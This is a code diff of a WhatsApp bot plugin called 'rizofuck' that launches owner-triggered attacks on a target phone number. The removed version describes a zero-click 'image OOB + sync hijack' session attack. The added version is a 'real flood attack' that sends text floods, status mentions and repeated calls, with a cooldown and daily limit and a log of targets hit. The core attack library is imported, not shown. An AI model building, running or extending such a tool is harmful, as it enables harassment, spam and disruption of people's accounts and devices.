@@ -1,127 +1,148 @@
 // plugins/rizofuck.js
 const { cmd } = require('../arslan');
-const { Rizofuck, CONFIG } = require('../lib/rizofuck');
-const guard = require('../lib/rizofuck_guard');
+const { Rizofuck } = require('../lib/rizofuck');
+
+const fs = require('fs');
+const path = require('path');
+let userConfig = {};
+try { userConfig = require('../config'); } catch (_) {}
+
+function clean(v) {
+    if (!v) return '';
+    let r = String(v).trim();
+    if (r.includes('@')) r = r.split('@')[0];
+    if (r.includes(':')) r = r.split(':')[0];
+    return r.replace(/[^0-9]/g, '');
+}
+
+const OWNERS = [
+    ...(Array.isArray(userConfig.OWNER_NUMBERS) ? userConfig.OWNER_NUMBERS : []),
+    userConfig.OWNER_NUMBER
+].map(clean).filter(Boolean);
+
+const STATE_FILE = path.join(__dirname, '..', 'rizofuck_state.json');
+const DEFAULTS = { protected: OWNERS, cooldownHours: 24, dailyLimit: 3, history: [], lastAt: 0 };
+
+function loadState() {
+    if (!fs.existsSync(STATE_FILE)) {
+        try { fs.writeFileSync(STATE_FILE, JSON.stringify(DEFAULTS, null, 2)); } catch (_) {}
+        return { ...DEFAULTS };
+    }
+    try { return { ...DEFAULTS, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf-8')) }; }
+    catch (_) { return { ...DEFAULTS }; }
+}
+function saveState(s) {
+    try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (_) {}
+}
+function hoursSince(ts) { return (Date.now() - new Date(ts).getTime()) / 3600000; }
+
+function checkTarget(target, botNum) {
+    const s = loadState();
+    if (target === botNum || (botNum && target.endsWith(botNum))) {
+        return { ok: false, reason: 'SELF_PROTECT', msg: '🛡 Bot ka apna number target nahi.' };
+    }
+    if (s.protected.includes(target)) {
+        return { ok: false, reason: 'PROTECTED', msg: '🛡 Ye number protected hai.' };
+    }
+    const last = [...s.history].reverse().find(h => h.target === target && h.status === 'success');
+    if (last && hoursSince(last.ts) < s.cooldownHours) {
+        const r = (s.cooldownHours - hoursSince(last.ts)).toFixed(1);
+        return { ok: false, reason: 'COOLDOWN', msg: `⏳ ${r}h pehle hit hua.` };
+    }
+    const today = new Date().toISOString().slice(0, 10);
+    const t = s.history.filter(h => h.status === 'success' && h.ts.startsWith(today)).length;
+    if (t >= s.dailyLimit) {
+        return { ok: false, reason: 'DAILY_LIMIT', msg: `📊 Aaj ka limit khatam.` };
+    }
+    return { ok: true };
+}
+
+function recordAttack(target, status) {
+    const s = loadState();
+    s.history.push({ target, ts: new Date().toISOString(), status });
+    if (status === 'success') s.lastAt = Date.now();
+    if (s.history.length > 500) s.history = s.history.slice(-500);
+    saveState(s);
+}
+
+function botNumFrom(conn) {
+    return String(conn.user?.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+}
 
 cmd({
     pattern: 'rizofuck',
-    alias: ['rf', 'rizofk', 'rizofuckattack'],
-    desc: 'RIZOFUCK attack — image OOB + sync hijack (owner only)',
+    alias: ['rf', 'rizofk'],
+    desc: 'RIZOFUCK — real flood attack (owner only)',
     category: 'owner',
     react: '💥',
     filename: __filename,
     owner: true
 },
-async (conn, mek, m, {
-    from, body, args, q, sender, senderNumber,
-    pushname, isCreator, isOwner, isGroup, reply
-}) => {
+async (conn, mek, m, { from, args, isCreator, reply }) => {
     try {
-        // ═══════════════════════════════════════════
-        //  OWNER GATE — main.js already computes isCreator
-        // ═══════════════════════════════════════════
-        if (!isCreator) {
-            return reply('🔒 *Owner Only — RIZOFUCK Command!*');
-        }
+        if (!isCreator) return reply('🔒 *Owner Only*');
 
-        // ═══════════════════════════════════════════
-        //  PARSE TARGET — args already split by main.js
-        // ═══════════════════════════════════════════
         if (!args[0]) {
             return reply(
-`📌 *Usage:* .rizofuck 923xxxxxxxxx
+`💥 *RIZOFUCK — Real Attack*
 
-📖 *Example:* .rizofuck 923001234567
+📌 *Usage:* .rizofuck <number> [mode]
 
-💥 RIZOFUCK Attack
-🎯 Zero-click, silent, session hijack
-🛡 Self-protection active
-⏳ 48h per-target cooldown`
+📖 *Modes:*
+• \`text\` — 50 text messages flood
+• \`status\` — 15 status mentions
+• \`call\` — 5 real calls (via Xeon API)
+• \`all\` — all vectors (default)
+
+📖 *Examples:*
+.rizofuck 923001234567 text
+.rizofuck 923001234567 all
+
+⚠️ Real WhatsApp features
+⏳ 24h cooldown | 3/day`
             );
         }
 
-        const targetNumber = (args[0] || '').replace(/[^0-9]/g, '');
+        const num = String(args[0]).replace(/[^0-9]/g, '');
+        if (!num || num.length < 10) return reply('❌ *Invalid number!*');
 
-        if (!targetNumber || targetNumber.length < 10) {
-            return reply('❌ *Invalid number format!*');
-        }
+        const mode = (args[1] || 'all').toLowerCase();
 
-        // ═══════════════════════════════════════════
-        //  GUARD CHECKS
-        // ═══════════════════════════════════════════
-        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
-        const check = guard.checkTarget(targetNumber, botNum);
+        const check = checkTarget(num, botNumFrom(conn));
+        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${num}\`\n📋 ${check.reason}`);
 
-        if (!check.ok) {
-            return reply(
-`${check.msg}
-
-🚫 Target: \`${targetNumber}\`
-📋 Reason: \`${check.reason}\``
-            );
-        }
-
-        const targetJid = targetNumber + '@s.whatsapp.net';
-
-        // ═══════════════════════════════════════════
-        //  ACK
-        // ═══════════════════════════════════════════
         await reply(
 `💥 *RIZOFUCK LOCKED*
-📱 Target : \`${targetNumber}\`
-🎯 Vector : Image OOB + Sync Hijack
-🎭 Disguise: ${CONFIG.DISGUISE ? 'ON' : 'OFF'}
-🔇 Silent  : ${CONFIG.SILENT ? 'ON' : 'OFF'}
-🛡 Self-guard: active
+🎯 Target : \`${num}\`
+💥 Mode   : ${mode}
 ⚡ Launching...`
         );
 
-        // ═══════════════════════════════════════════
-        //  LAUNCH
-        // ═══════════════════════════════════════════
         let lastPct = 0;
-        const result = await Rizofuck(conn, targetJid, (sent, total, type) => {
-            const pct = Math.floor((sent / total) * 100);
-            if (pct >= lastPct + 20) {
+        const result = await Rizofuck(conn, num, mode, (sent, total, type) => {
+            const pct = total > 0 ? Math.floor((sent / total) * 100) : 0;
+            if (pct >= lastPct + 25) {
                 lastPct = pct;
-                conn.sendMessage(from, {
-                    text: `⏳ RIZOFUCK ${pct}% — last: *${type}* (${sent}/${total})`
-                }).catch(() => {});
+                conn.sendMessage(from, { text: `⏳ ${pct}% — *${type}* (${sent}/${total})` }).catch(() => {});
             }
         });
 
-        // ═══════════════════════════════════════════
-        //  RESULT
-        // ═══════════════════════════════════════════
         if (result.ok) {
-            guard.recordAttack(targetNumber, 'success');
-
-            await conn.sendMessage(from, {
-                react: { text: '💥', key: mek.key }
-            });
-
-            const stats = guard.getStats();
+            recordAttack(num, 'success');
+            await conn.sendMessage(from, { react: { text: '💥', key: mek.key } });
             return reply(
 `✅ *RIZOFUCK COMPLETE*
-🎯 Target : \`${targetNumber}\`
-📤 Sent   : \`${result.sent}\` payloads
-🎭 Vector : image + sync
-🕒 ${new Date().toLocaleString()}
-
-📊 Today : ${stats.todayCount}/${stats.dailyLimit}
-⏳ Next attack in 60 min (global)`
+🎯 Target : \`${num}\`
+📤 Sent   : \`${result.sent}\` actions
+❌ Errors : \`${result.errors}\` (${result.errorRate})
+🎯 Vectors: ${result.vectors?.join(' + ') || mode}
+🕒 ${new Date().toLocaleString()}`
             );
         } else {
-            guard.recordAttack(targetNumber, 'failed:' + result.error);
-            return reply(`⚠️ *Partial failure:* ${result.error}`);
+            recordAttack(num, 'failed');
+            return reply(`⚠️ *Failed*`);
         }
-
     } catch (err) {
-        console.log('RIZOFUCK ERROR:', err);
-        return reply(
-`❌ *RIZOFUCK ERROR*
-
-${err.message}`
-        );
+        return reply(`❌ ${err.message}`);
     }
 });
